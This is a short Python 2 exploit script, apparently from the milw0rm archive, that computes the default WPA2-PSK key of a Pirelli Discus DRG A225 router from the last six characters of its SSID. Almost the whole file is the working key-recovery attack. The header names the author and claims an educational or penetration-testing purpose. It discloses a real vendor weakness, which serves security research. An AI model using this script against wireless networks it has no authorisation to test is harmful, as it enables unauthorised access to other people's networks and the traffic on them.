#!/usr/bin/python 
# 
# Pirelli Discus DRG A225 WiFi router 
# Default WPA2-PSK algorithm vulnerability 
#
# paper: http://milw0rm.com/papers/313
# 
# With this code we can predict the WPA2-PSK key... 
# 
# Hacked up by Muris Kurgas aka j0rgan 
#            j0rgan (-@-) remote-exploit.org 
#        http://www.remote-exploit.org 
# 
# Use for education or legal penetration testing purposes..... 
#  
import sys 
 
def hex2dec(s): 
 return int(s, 16) 
 
if len(sys.argv) < 2 or len(sys.argv[1]) != 6: 
 print "\r\nEnter the last 6 chars from Discus SSID" 
 print "i.e. SSID should be 'Discus--XXXXXX', where XXXXXX is last 6 chars\r\n" 
 exit() 
const = hex2dec('D0EC31') 
inp = hex2dec(sys.argv[1]) 
result = (inp - const)/4 
 
print "Possible PSK for Discus--"+sys.argv[1]+" would be: YW0"+str(result) 

# milw0rm.com [2009-04-06]
